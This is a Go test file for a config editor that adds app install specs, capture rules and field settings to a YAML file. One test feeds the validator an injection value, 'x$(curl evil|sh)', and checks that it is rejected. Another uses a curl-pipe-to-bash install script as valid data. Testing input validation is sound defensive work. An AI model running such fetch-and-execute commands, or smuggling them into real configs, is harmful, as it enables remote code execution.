package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func editFixture(t *testing.T) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), FileName)
	body := "version: 2\napps:\n  - id: htop # keep this\n    group: tools\n    install:\n      debian: {apt: htop}\n"

	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}

	return path
}

func loadEdited(t *testing.T, path string) (*Config, string) {
	t.Helper()
	data, _ := os.ReadFile(path)
	cfg, err := Parse(data)

	if err != nil {
		t.Fatal(err)
	}

	return cfg, string(data)
}

func TestAddInstallNewApp(t *testing.T) {
	path := editFixture(t)

	if err := AddInstall(path, "hermes", "any", InstallSpec{Script: "curl -fsSL https://x/install.sh | bash", Bin: "hermes"}, "ai"); err != nil {
		t.Fatal(err)
	}

	cfg, raw := loadEdited(t, path)
	app, ok := cfg.App("hermes")

	if !ok || app.Group != "ai" || app.Install["any"].Bin != "hermes" {
		t.Errorf("app = %+v", app)
	}

	if !strings.Contains(raw, "# keep this") {
		t.Errorf("comment lost:\n%s", raw)
	}
}

func TestAddInstallExistingAppKeepsOtherPlatforms(t *testing.T) {
	path := editFixture(t)

	if err := AddInstall(path, "htop", "macos", InstallSpec{Apt: "htop"}, ""); err != nil {
		t.Fatal(err)
	}

	cfg, _ := loadEdited(t, path)
	app, _ := cfg.App("htop")

	if app.Install["debian"].Apt != "htop" || app.Install["macos"].Apt != "htop" || len(cfg.Apps) != 1 {
		t.Errorf("app = %+v", app)
	}
}

func TestEditRejectsInvalidChange(t *testing.T) {
	path := editFixture(t)
	before, _ := os.ReadFile(path)
	err := AddInstall(path, "evil", "any", InstallSpec{Npm: "x$(curl evil|sh)"}, "")

	if err == nil {
		t.Fatal("unsafe spec accepted")
	}

	if after, _ := os.ReadFile(path); string(after) != string(before) {
		t.Error("file changed after a rejected edit")
	}
}

func TestAddCaptureAndSetApp(t *testing.T) {
	path := editFixture(t)

	if err := AddCapture(path, "fish", "linux", FileRule{Base: "~/.config/fish", Include: []string{"**"}}); err != nil {
		t.Fatal(err)
	}

	if err := SetApp(path, "htop", map[string]string{"enabled": "false", "skip": "macos, arch", "version": "3.3.0"}); err != nil {
		t.Fatal(err)
	}

	cfg, _ := loadEdited(t, path)
	app, _ := cfg.App("htop")

	if app.IsEnabled() || len(app.Skip) != 2 || app.Version != "3.3.0" {
		t.Errorf("app = %+v", app)
	}

	if cfg.Capture["fish"]["linux"].Base != "~/.config/fish" {
		t.Errorf("capture = %v", cfg.Capture)
	}

	if err := SetApp(path, "htop", map[string]string{"version": ""}); err != nil {
		t.Fatal(err)
	}

	if cfg, _ = loadEdited(t, path); cfg.Apps[0].Version != "" {
		t.Error("empty value did not remove the field")
	}
}

func TestSetAppErrors(t *testing.T) {
	path := editFixture(t)

	if err := SetApp(path, "nope", map[string]string{"enabled": "false"}); err == nil {
		t.Error("unknown app accepted")
	}

	if err := SetApp(path, "htop", map[string]string{"color": "red"}); err == nil {
		t.Error("unknown field accepted")
	}

	if err := SetApp(path, "htop", map[string]string{"enabled": "maybe"}); err == nil {
		t.Error("bad bool accepted")
	}
}
